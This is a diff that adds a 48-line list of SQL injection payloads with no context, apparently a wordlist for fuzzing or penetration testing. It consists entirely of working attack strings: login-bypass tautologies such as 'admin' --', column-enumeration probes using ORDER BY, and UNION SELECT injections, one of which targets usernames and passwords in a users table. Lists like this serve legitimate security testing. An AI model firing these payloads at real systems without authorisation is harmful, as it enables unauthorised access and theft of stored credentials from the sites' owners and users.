@@ -1,0 +1,48 @@
+1 ' OR '1'='1
+1 ' OR '1'='1' --
+1 ' OR 1=1 --
+1 ' OR 1=1#
+1 ' OR 'a'='a
+admin' --
+admin' #
+admin'/*
+1 ' OR '1'='1' /* 
+1 ' OR 1=1#
+1 ' OR 1=1/* 
+1 ' OR 'x'='x
+1 ' or ''='
+1 ' or 1=1--
+1 ' or 1=1#
+1 ' or 1=1/*
+1 ') or ('1'='1
+1 ') or ('1'='1'--
+1 ') or ('1'='1'#
+1 ') or ('1'='1'/*
+1 ') or 1=1--
+1 ") or 1=1--
+1 " OR "1"="1
+1 " OR 1=1 --
+1 " OR 1=1#
+1 " OR "a"="a
+admin" --
+admin"#
+admin"/*
+1 ' or 1=1 limit 1 --
+1 ' or '1'='1' limit 1 --
+1 ' or 1=1 union select 1,2,3 --
+1 ' or 1=1 union select null,null,null --
+1 ' or 1=1 union select username,password from users --
+1 ' OR 1=1 ORDER BY 1--
+1 ' OR 1=1 ORDER BY 2--
+1 ' OR 1=1 ORDER BY 3--
+1 ' OR 1=1 GROUP BY column --
+1 ' OR 1=1 HAVING 1=1 --
+1 ' OR 1=1 -- -
+1 ' OR 1=1 # -
+1 ' OR 1=1 /* -
+1 ') OR 1=1 --
+1 ' OR 1=1 LIMIT 1 OFFSET 0 --
+admin' OR '1'='1
+admin' OR 1=1 --
+admin' OR 1=1#
+admin' OR 1=1/*
